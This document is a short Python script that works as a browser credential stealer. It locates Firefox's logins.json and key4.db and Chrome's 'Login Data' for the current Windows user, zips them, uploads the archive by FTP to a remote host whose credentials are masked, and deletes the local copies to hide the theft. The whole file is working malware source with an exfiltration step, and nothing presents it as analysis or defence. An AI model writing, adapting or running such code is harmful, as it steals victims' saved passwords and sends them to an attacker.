import getpass
import shutil
import ftplib
import os
import socket
import time
import requests

flag_login_mozilla = False

# Get User System
user_sys = getpass.getuser()

# Address Folder Mozilla
address_mozilla = "C:\\Users\\"+ user_sys +"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"

# Address Folder Chrome
address_chrome = "C:\\Users\\"+user_sys+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"

# List Dir Folder Mozilla
list_addr_1 = []
for x in os.listdir(address_mozilla):
    list_addr_1.append(x)

list_addr_2 = []
for y in list_addr_1:
    list_addr_2 = address_mozilla + '\\' + y
    for a in os.listdir(list_addr_2):
        if(a == "key4.db"):
            final_address_mozilla = list_addr_2
            flag_mozilla = True
        if(a == "logins.json"):
            flag_login_mozilla = True

# List Dir Folder Chrome
list_addr_3 = []
for z in os.listdir(address_chrome):
    list_addr_3.append(z)
    if(z == "Login Data"):
        final_address_chrome = address_chrome
        flag_chrome = True

        
# Zip Folder Mozillad Firefox
file_login = 'logins.json'
file_key = 'key4.db'
address_save = "D:\\"+user_sys
format_file = 'zip'

# Zip Folder Chrome
file_login_chrome = 'Login Data'

os.mkdir(address_save)
if flag_login_mozilla == True :
    shutil.copy2(final_address_mozilla+'\\'+file_login , address_save+'\\'+file_login)
if flag_mozilla == True :    
    shutil.copy2(final_address_mozilla+'\\'+file_key , address_save+'\\'+file_key)
if flag_chrome == True :
    shutil.copy2(final_address_chrome+'\\'+file_login_chrome , address_save+'\\'+file_login_chrome)

zipp = shutil.make_archive(address_save,format_file,address_save)

shutil.rmtree(address_save)

host = "***"
user = "***"
passs = "***"
ftp = ftplib.FTP(host)
ftp.login(user , passs)
file = open(zipp , 'rb')

ftp.storbinary('STOR '+user_sys+'.zip' , file)
file.close()

os.remove(address_save+'.zip')

